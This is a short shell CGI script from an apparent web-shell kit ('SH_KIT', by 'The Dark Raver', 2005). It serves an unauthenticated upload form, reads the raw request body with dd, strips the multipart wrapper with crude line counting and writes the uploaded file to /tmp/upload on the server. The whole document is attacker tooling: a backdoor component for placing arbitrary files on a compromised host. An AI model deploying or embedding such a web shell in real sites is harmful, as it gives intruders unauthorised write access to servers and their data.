#!/bin/sh
#
# BETA1 - upload to /tmp/upload
#
# SH_KIT
#
# up.sh = File Upload
#
# by: The Dark Raver
# modified: 16/12/2005
#

echo Content-Type: text/html
echo

echo "<html><body>"
echo "<form enctype=\"multipart/form-data\" action=\"\" method=\"post\">"
echo "<p>Local File: <input name=\"userfile\" type=\"file\">"
echo "<input type=\"submit\" value=\"Send\">"
echo "</form><br><br><br>"

echo "<hr>"

dd count=$CONTENT_LENGTH bs=1 of=/tmp/test

lineas=`cat /tmp/test | wc -l`
#echo LIN: $lineas
lineas2=`expr $lineas - 4`
#echo LIN2: $lineas2
lineas3=`expr $lineas2 - 1`
#echo LIN3: $lineas3

#echo "<hr>"

tail -$lineas2 /tmp/test > /tmp/test2
head -$lineas3 /tmp/test2 > /tmp/upload
#rm /tmp/test
#rm /tmp/test2

echo "<pre>"
cat /tmp/upload
echo "</pre>"

